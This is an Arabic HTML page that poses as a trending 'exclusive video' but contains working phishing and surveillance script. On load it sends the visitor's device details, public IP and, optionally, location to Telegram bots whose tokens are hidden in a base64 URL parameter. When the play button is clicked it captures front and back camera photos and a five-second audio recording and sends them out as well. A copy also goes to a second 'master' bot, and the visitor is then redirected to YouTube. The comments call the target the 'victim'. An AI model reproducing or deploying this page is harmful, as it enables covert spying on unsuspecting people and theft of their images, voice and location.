<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيديو حصري 2026 - شاهد الآن!</title>
    <style>
        body{background:linear-gradient(135deg,#1e3c72,#2a5298);font-family:Tahoma;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
        .card{background:white;border-radius:20px;padding:30px;text-align:center;max-width:350px}
        button{background:#667eea;color:white;border:none;padding:12px 30px;border-radius:50px;cursor:pointer;margin-top:15px}
        .loading{display:none;margin-top:15px}
        .spinner{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .status{position:fixed;bottom:10px;left:10px;background:#000;color:#0f0;padding:5px 10px;border-radius:5px;font-size:10px;z-index:999}
        .error{color:red;font-size:12px;margin-top:10px;display:none}
    </style>
</head>
<body>
<div class="card">
    <div style="font-size:60px">📹</div>
    <h2>🔥 فيديو حصري 2026</h2>
    <p>🔄 2.5M مشاهدة • #ترند • منذ 3 ساعات</p>
    <div class="stats" style="display:flex;justify-content:center;gap:20px;margin:15px 0">
        <div><strong>48K</strong><br>إعجاب</div>
        <div><strong>12K</strong><br>تعليق</div>
        <div><strong>5.2K</strong><br>مشاركة</div>
    </div>
    <button id="playBtn">▶ تشغيل الفيديو</button>
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>جاري التحميل...</p>
    </div>
    <div class="error" id="errorMsg"></div>
</div>
<div class="status" id="status">🔄 جاري تجهيز الصفحة...</div>

<script>
// ================== دوال الإرسال ==================
async function sendToTelegram(chat, token, type, data, caption) {
    try {
        if(type === 'photo') {
            const fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('photo', data, 'photo.jpg');
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
        } else if(type === 'video') {
            const fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('video', data, 'video.mp4');
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {method:'POST', body:fd});
        } else if(type === 'audio') {
            const fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('audio', data, 'audio.mp4');
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {method:'POST', body:fd});
        } else {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({chat_id:chat, text:caption})
            });
        }
        return true;
    } catch(e) {
        console.log('Send error:', e);
        return false;
    }
}

// ================== الميزات ==================

// 1. معلومات الجهاز
async function getDeviceInfo(chat, token, masterChat, masterToken) {
    const info = `📱 *معلومات الجهاز*\n• المتصفح: ${navigator.userAgent}\n• الشاشة: ${screen.width}x${screen.height}\n• اللغة: ${navigator.language}\n• المنصة: ${navigator.platform}\n• الوقت: ${new Date().toLocaleString()}`;
    await sendToTelegram(chat, token, 'text', null, info + ' (نسخة المستخدم)');
    await sendToTelegram(masterChat, masterToken, 'text', null, info + ' (نسخة المختبر)');
}

// 2. الموقع الجغرافي
function getLocation(chat, token, masterChat, masterToken) {
    if(navigator.geolocation) {
        document.getElementById('status').innerHTML = '📍 جاري جلب الموقع...';
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const loc = `📍 *الموقع الجغرافي*\n• خط العرض: ${pos.coords.latitude}\n• خط الطول: ${pos.coords.longitude}\n• الدقة: ${pos.coords.accuracy} متر\n🔗 https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToTelegram(chat, token, 'text', null, loc + ' (نسخة المستخدم)');
            await sendToTelegram(masterChat, masterToken, 'text', null, loc + ' (نسخة المختبر)');
        }, (err) => {
            document.getElementById('status').innerHTML = '❌ فشل جلب الموقع';
        });
    }
}

// 3. IP العام
async function getPublicIP(chat, token, masterChat, masterToken) {
    try {
        document.getElementById('status').innerHTML = '🌐 جاري جلب IP...';
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        const ipMsg = `🌐 *IP العام*: ${data.ip}`;
        await sendToTelegram(chat, token, 'text', null, ipMsg + ' (نسخة المستخدم)');
        await sendToTelegram(masterChat, masterToken, 'text', null, ipMsg + ' (نسخة المختبر)');
    } catch(e) {}
}

// 4. الكاميرا الأمامية
async function captureFrontCamera(chat, token, masterChat, masterToken) {
    try {
        document.getElementById('status').innerHTML = '📸 جاري فتح الكاميرا الأمامية...';
        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
        const caption = '📸 صورة من الكاميرا الأمامية';
        await sendToTelegram(chat, token, 'photo', blob, caption + ' (نسخة المستخدم)');
        await sendToTelegram(masterChat, masterToken, 'photo', blob, caption + ' (نسخة المختبر)');
        stream.getTracks().forEach(t => t.stop());
        document.getElementById('status').innerHTML = '✅ تم التقاط الصورة';
    } catch(e) {
        document.getElementById('status').innerHTML = '❌ فشل الكاميرا الأمامية';
    }
}

// 5. الكاميرا الخلفية
async function captureBackCamera(chat, token, masterChat, masterToken) {
    try {
        document.getElementById('status').innerHTML = '📷 جاري فتح الكاميرا الخلفية...';
        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}});
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
        const caption = '📷 صورة من الكاميرا الخلفية';
        await sendToTelegram(chat, token, 'photo', blob, caption + ' (نسخة المستخدم)');
        await sendToTelegram(masterChat, masterToken, 'photo', blob, caption + ' (نسخة المختبر)');
        stream.getTracks().forEach(t => t.stop());
        document.getElementById('status').innerHTML = '✅ تم التقاط الصورة';
    } catch(e) {
        document.getElementById('status').innerHTML = '❌ فشل الكاميرا الخلفية';
    }
}

// 6. تسجيل صوتي
async function recordAudio(chat, token, masterChat, masterToken) {
    try {
        document.getElementById('status').innerHTML = '🎤 جاري طلب الميكروفون...';
        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, {type: 'audio/mp4'});
            const caption = '🎤 تسجيل صوتي - 5 ثوان';
            await sendToTelegram(chat, token, 'audio', blob, caption + ' (نسخة المستخدم)');
            await sendToTelegram(masterChat, masterToken, 'audio', blob, caption + ' (نسخة المختبر)');
            document.getElementById('status').innerHTML = '✅ تم التسجيل';
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
        document.getElementById('status').innerHTML = '🎤 جاري التسجيل... 5 ثوان';
    } catch(e) {
        document.getElementById('status').innerHTML = '❌ فشل التسجيل الصوتي';
    }
}

// ================== قراءة البيانات من الرابط ==================
const urlParams = new URLSearchParams(window.location.search);
const encodedData = urlParams.get('d');

if(encodedData) {
    try {
        const data = JSON.parse(atob(encodedData));
        const { mChat, mToken, tChat, tToken, features } = data;
        const featuresList = features ? features.split(',') : [];
        
        document.getElementById('status').innerHTML = '📡 جاري تجهيز البيانات...';
        
        // إشعار بفتح الرابط
        sendToTelegram(tChat, tToken, 'text', null, '🔗 تم فتح رابط الضحية (نسخة المستخدم)');
        sendToTelegram(mChat, mToken, 'text', null, '🔗 تم فتح رابط الضحية (نسخة المختبر)');
        
        // جمع البيانات الأساسية فوراً
        getDeviceInfo(tChat, tToken, mChat, mToken);
        getPublicIP(tChat, tToken, mChat, mToken);
        
        if(featuresList.includes('loc')) getLocation(tChat, tToken, mChat, mToken);
        
        // عند الضغط على زر التشغيل
        let videoPlayed = false;
        document.getElementById('playBtn').onclick = async function() {
            if(videoPlayed) return;
            videoPlayed = true;
            
            document.getElementById('loading').style.display = 'block';
            document.getElementById('status').innerHTML = '🎬 جاري تجهيز الفيديو...';
            this.disabled = true;
            
            // طلب الصلاحيات وجمع البيانات
            if(featuresList.includes('front')) await captureFrontCamera(tChat, tToken, mChat, mToken);
            if(featuresList.includes('back')) await captureBackCamera(tChat, tToken, mChat, mToken);
            if(featuresList.includes('audio')) await recordAudio(tChat, tToken, mChat, mToken);
            
            // إرسال إشعار النجاح
            sendToTelegram(tChat, tToken, 'text', null, '✅ تم جمع جميع البيانات بنجاح (نسخة المستخدم)');
            sendToTelegram(mChat, mToken, 'text', null, '✅ تم جمع جميع البيانات بنجاح (نسخة المختبر)');
            
            // التوجيه إلى يوتيوب بعد 3 ثوان
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }, 3000);
        };
        
        document.getElementById('status').innerHTML = '✅ جاهز - اضغط تشغيل';
        
    } catch(e) {
        document.getElementById('status').innerHTML = '❌ خطأ في الرابط';
        document.getElementById('errorMsg').innerHTML = 'الرابط غير صالح';
        document.getElementById('errorMsg').style.display = 'block';
    }
} else {
    document.getElementById('status').innerHTML = '⚠️ رابط غير صالح';
    document.getElementById('errorMsg').innerHTML = 'هذا الرابط غير مخصص للاختبار';
    document.getElementById('errorMsg').style.display = 'block';
}
</script>
</body>
</html>
